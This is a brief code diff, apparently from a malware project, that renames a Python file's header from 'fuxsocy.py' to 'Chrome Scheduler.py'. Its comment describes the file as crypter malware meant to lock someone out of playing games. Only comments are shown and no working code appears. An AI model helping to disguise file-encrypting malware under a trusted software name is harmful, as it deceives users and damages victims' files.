@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# fuxsocy.py
+# Chrome Scheduler.py
 #
 # Simple crypter malware to prohibit you fucking ignorant dumbass
 # from playing computer games.
